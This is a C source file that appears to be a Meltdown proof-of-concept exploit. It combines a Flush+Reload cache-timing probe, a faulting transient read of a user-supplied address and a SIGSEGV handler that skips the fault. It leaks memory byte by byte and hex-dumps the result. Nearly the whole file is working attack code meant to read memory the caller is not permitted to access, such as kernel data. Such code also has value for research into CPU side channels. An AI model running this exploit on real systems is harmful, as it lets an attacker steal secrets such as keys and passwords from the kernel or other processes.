#define _GNU_SOURCE
#define __USE_GNU

// flush_reload from https://github.com/defuse/flush-reload-attacks
// TSX from https://github.com/andikleen/tsx-tools
// dump_hex from https://gist.github.com/ccbrown/9722406

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>

#include <sys/mman.h>

#define NUM_PROBES 5
#define TEST_IN_OWN_PROCESS 0
#define TEST_PHRASE "Hmm, this does really work!"

__attribute__((always_inline))
inline void flush(const char *adrs)
{
  asm __volatile__ (
     "mfence         \n"
     "clflush 0(%0)  \n"
     :
     : "r" (adrs)
     :
  );
}

__attribute__((always_inline))
inline unsigned long probe(const char *adrs)
{
  volatile unsigned long time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

  return time;
}

unsigned char probe_one(size_t ptr, char* buf, int page_size)
{
   const int num_probes = NUM_PROBES;
   int c, i, status = 0, min_idx = 0, win_idx = 0;
   unsigned long times[256];
   unsigned char guessed_char = 0, tests[256];
   unsigned long long t1 = 0;
   volatile uint64_t val;
   
   memset(tests, 0, 256);
   
   for (c = 0; c < num_probes; c++) {
      memset(times, 0, sizeof(unsigned long) * 256);
      
      for (i=0; i<256; i++) {
         flush(&buf[i * page_size]);
      }
   
      asm __volatile__ (
           "%=:                              \n"
           "xorq %%rax, %%rax                \n"
           "movb (%[ptr]), %%al              \n"
           "shlq $0xc, %%rax                 \n"
           "jz %=b                           \n"
           "movq (%[buf], %%rax, 1), %%rbx   \n"
           : 
           :  [ptr] "r" (ptr), [buf] "r" (buf)
           :  "%rax", "%rbx");
      
      asm __volatile__ ("mfence\n" :::);

      for (i=0; i<256; i++) {
         times[i] = probe(&buf[i * page_size]);
      }
   
      for (i=0; i<256; i++) {
         min_idx = (times[min_idx] > times[i]) ? i : min_idx;
      }
      
      tests[min_idx]++;
   }
   
   for (i=0; i<256; i++) {
      win_idx = (tests[i] > tests[win_idx]) ? i : win_idx;
   }
   
   return (unsigned char)win_idx;
}

void sighandler(int sig, siginfo_t *info, void *_context)
{
    ucontext_t *context = (ucontext_t *)(_context);
    // move PC offset from segfaulting movb, to the mfence instr
    context->uc_mcontext.gregs[REG_RIP] += 12;
}

void dump_hex(void* addr, const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
   printf("0x%016lx | ", (unsigned long)addr);
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int main(int argc, char** argv)
{
   unsigned char read_buf[16];
   int page_size = getpagesize(), raw_output = 0;
   unsigned long start_addr = 0;
   unsigned long t, len = 0;

   struct sigaction sa;
   sa.sa_sigaction = sighandler;
   sa.sa_flags = SA_SIGINFO;
   sigaction(SIGSEGV, &sa, NULL);

#if TEST_IN_OWN_PROCESS
   static char* test = TEST_PHRASE;
   
   start_addr = (unsigned long)test;
   len = strlen(test);
#else
   if (argc < 3 || argc > 4) {
      printf("usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n",
         argv[0]);
      return 0;
   }
   
   start_addr = strtoul(argv[1], NULL, 16);
   len = strtoul(argv[2], NULL, 10);
   
   if (argc == 4) {
      raw_output = 1;
   }
#endif
   
   char* poke = (char*)mmap(
      NULL,
      256 * page_size,
      PROT_READ | PROT_WRITE,
      MAP_ANON | MAP_SHARED,
      -1,
      0
   );
      
   if (MAP_FAILED == poke) {
      printf("mmap() failed: %s\n", strerror(errno));
      return -1;
   }
      
   printf ("poke buffer: %p, page size: %i\n", poke, page_size);
   
   for (t=0; t<len; t++) {
      if (!raw_output && t > 0 && 0 == t%16) {
         dump_hex((void*)(start_addr + t - 16), read_buf, 16);
      }
      
      read_buf[t%16] = probe_one(start_addr + t, poke, page_size);
      
      if (raw_output) {
         write(STDOUT_FILENO, &read_buf[t%16], 1);
      }
   }
   
   if (!raw_output && t > 0) {
      dump_hex((void*)(start_addr + ((t%16 ? t : (t-1))/16) * 16),
         read_buf, t%16 ? t%16 : 16);
   }
      
   munmap((void*)poke, 256 * page_size);
}
